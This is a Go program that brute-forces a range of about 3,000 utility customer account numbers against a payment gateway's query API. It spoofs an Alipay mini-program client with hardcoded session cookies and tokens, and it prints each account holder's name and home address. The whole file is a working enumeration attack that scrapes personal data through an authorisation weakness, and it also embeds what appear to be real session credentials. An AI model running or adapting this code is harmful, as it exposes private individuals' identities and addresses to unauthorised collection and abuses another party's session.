package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"github.com/panjf2000/ants/v2"
	"io/ioutil"
	"net/http"
	"strings"
	"sync"
	"time"
)

type arg struct {
	mini   string
	cookie string
}

var args arg

type params struct {
	App_id      string `json:"app_id"`
	Page_name   string `json:"page_name"`
	Sign_type   string `json:"sign_type"`
	Page_source string `json:"page_source"`
	Method      string `json:"method"`
	Query_type  string `json:"query_type"`
	Query_value string `json:"query_value"`
}

type responses struct {
	Ret_code int     `json:"ret_code"`
	Content  content `json:"content"`
	Ret_msg  string  `json:"ret_msg"`
}
type content struct {
	Rtn_flag  string   `json:"rtn_flag"`
	Cons_list []result `json:"cons_list"`
	Rtn_msg   string   `json:"rtn_msg"`
}

type result struct {
	Cons_addr   string `json:"cons_addr"`
	Cons_no     string `json:"cons_no"`
	Pubms_code  string `json:"pubms_code"`
	Cons_name   string `json:"cons_name"`
	Acct_org_no string `json:"acct_org_no"`
}

var p params

func main() {
	fmt.Println("正在批量获取户号范围：8307147000-8307149999的户号信息，总计2999个请求...")
	//flag.StringVar(&args.mini, "mini", "", "传入alipayMiniMark")
	flag.StringVar(&args.cookie, "cookie", "", "传入cookie")
	//args.cookie = "T=d718ed0340195ac93597c759e9ac5f5956db9aae98054fcbf039db202eb1e6c77c1f5c205bf8c3cb9640731070bc3a4bef5dd19cda3dfdb7ba10b32c66e545341a4dc7e2d4fce99ca2c61dc0e6276f1b; birth=BI26025; acw_tc=76b20f6816228228667072164e05f182795237825aa9612a6fa0109ce0e95d\n"
	args.cookie = "T=d718ed0340195ac93597c759e9ac5f5956db9aae98054fcbf039db202eb1e6c77c1f5c205bf8c3cb9640731070bc3a4b4f0efe509cdf8aaa2672a36ad0d954b1df13eab9e31ff0a48a217139a49dbf95; birth=BI23431; acw_tc=76b20f6516228247333391917e0cc53ba64dedb9f44e90597ce1c3998a628d"
	flag.Parse()
	Testing("https://openapi.bangdao-tech.com/gateway.do")
}

func Testing(URL string) {
	p.App_id = "2021001156630185"
	p.Page_name = ""
	p.Sign_type = "token"
	p.Page_source = "MINI_PRODUCT"
	p.Query_type = "MANUAL"
	p.Method = "bangdao.product.cons.query"

	p.Query_value = ""

	var wg sync.WaitGroup

	p, _ := ants.NewPoolWithFunc(5, func(s interface{}) {
		requets(URL, s.(int))
		wg.Done()
	})
	defer p.Release()

	//8307147000-8307149999
	for i := 8307147000; i < 8307149999; i++ {
		wg.Add(1)
		_ = p.Invoke(i)
	}
	wg.Wait()
}

func requets(URL string, count int) {

	var results = responses{}

	p.Query_value = fmt.Sprintf("%d", count)
	//构造请求参数和超时信息
	client := &http.Client{Timeout: 5 * time.Second}

	marshal, err := json.Marshal(p)

	if err != nil {
		fmt.Println(URL, "构造请求参数错误")
	}
	//请求结束后关闭连接
	defer client.CloseIdleConnections()
	request, reqErr := http.NewRequest("POST", URL, strings.NewReader(string(marshal)))
	if reqErr != nil {
		fmt.Println(URL, "构造请求错误")
	} else {
		request.Header.Add("Host", "openapi.bangdao-tech.com")
		request.Header.Add("Accept", "*/*")
		request.Header.Add("Accept-Charset", "utf-8")
		request.Header.Add("Accept-Encoding", "gzip, deflate, br")
		request.Header.Add("Accept-Language", "zh-CN,en-US;q=0.8")
		request.Header.Add("Content-Type", "application/json")
		request.Header.Add("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/17H35 Ariver/1.1.0 AliApp(AP/10.2.20.6000) Nebula WK RVKType(0) AlipayDefined(nt:WIFI,ws:375|603|2.0) AlipayClient/10.2.20.6000 Language/zh-Hans Region/CN NebulaX/1.0.0")
		request.Header.Add("Referer", "https://2021001156630185.hybrid.alipay-eco.com/2021001156630185/0.2.2104301655.8/index.html#pages/index/index")
		request.Header.Add("alipayMiniMark", "tX+sM6xFkhUTArVRNgmD6EXakNjrI/vCT1wmF4NEyfGrLRRmg577uBvKd94LFkVcOjKaQXd4HuBy6vySYpxpV+sXxswR63Tprp6AhKc3Rgw=")

		args.cookie = strings.Replace(args.cookie, " ", "", -1)
		cookieList := strings.Split(args.cookie, ";")

		T := strings.Replace(strip(cookieList[0]), "T=", "", -1)
		birth := strings.Replace(strip(cookieList[1]), "birth=", "", -1)
		acwTc := strings.Replace(strip(cookieList[2]), "acw_tc=", "", -1)

		request.AddCookie(
			&http.Cookie{
				Name:    "T",
				Value:   T,
				Expires: time.Now().Add(1 * time.Second),
			})
		request.AddCookie(
			&http.Cookie{
				Name:    "birth",
				Value:   birth,
				Expires: time.Now().Add(1 * time.Second),
			})
		request.AddCookie(
			&http.Cookie{
				Name:    "acw_tc",
				Value:   acwTc,
				Expires: time.Now().Add(1 * time.Second),
			})

		response, err := client.Do(request)

		if err != nil {
			fmt.Println(URL, "请求错误")
		} else {
			defer response.Body.Close()
			all, err := ioutil.ReadAll(response.Body)

			if err != nil {
				fmt.Println(URL, "读取响应失败")
			}

			//fmt.Println(string(all))
			err2 := json.Unmarshal(all, &results)
			if err2 != nil {
				//fmt.Println(err.Error())
			} else {
				conList := results.Content.Cons_list
				for i := 0; i < len(conList); i++ {
					data := fmt.Sprintf("地址：%s 名称：%s", conList[i].Cons_addr, conList[i].Cons_name)
					fmt.Println(data)
				}
			}
		}
	}
}

func strip(s string) string {
	s = strings.Replace(s, " ", "", -1)
	s = strings.Replace(s, "\n", "", -1)
	s = strings.Replace(s, "\t", "", -1)
	return s
}
